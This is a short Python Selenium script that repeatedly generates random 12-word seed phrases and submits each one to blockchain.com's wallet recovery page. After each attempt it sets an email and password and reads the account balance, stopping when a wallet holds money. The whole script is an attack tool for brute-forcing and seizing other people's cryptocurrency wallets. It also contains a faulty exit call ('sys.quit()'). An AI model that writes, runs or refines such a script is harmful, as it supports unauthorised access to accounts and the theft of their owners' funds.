#python
import sys

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
from mnemonic import Mnemonic

driver = webdriver.Chrome('chromedriver.exe')

def twelvewordgen():
    global words
    mnemo = Mnemonic("english")
    words = mnemo.generate(strength=128)
    print(words)

def blockchain():
    driver.get("https://login.blockchain.com/#/recover")
    time.sleep(1)
    input = driver.find_element_by_xpath("/html/body/div/div/div[3]/div/form/div[2]/div/div[2]/div[1]/input")
    input.clear()
    input.send_keys(words)
    input.send_keys(Keys.RETURN)
    email = driver.find_element_by_xpath('/html/body/div/div/div[3]/div/form/div[1]/div/div[1]/input')
    email.send_keys('ADDYOUROWNEMAIL@EMAIL.COM')
    password = driver.find_element_by_xpath('/html/body/div/div/div[3]/div/form/div[2]/div/div[1]/input')
    password.send_keys('randompassword123')
    conpassword = driver.find_element_by_xpath('/html/body/div/div/div[3]/div/form/div[3]/div/div[1]/input')
    conpassword.send_keys('randompassword123')
    conpassword.send_keys(Keys.RETURN)
    time.sleep(7)
    skip = driver.find_element_by_xpath('/html/body/div/div/div[3]/div/div/div/div/div/span/div/div[3]/button[2]')
    skip.click()
    money = driver.find_element_by_xpath('/html/body/div/div/div[5]/div[2]/div/div/section/div[1]/div/div[1]/div[2]')
    print(money.text)
    if money.text == "$0.00":
        return
    else:
        sys.quit()

while True:
    twelvewordgen()
    blockchain()

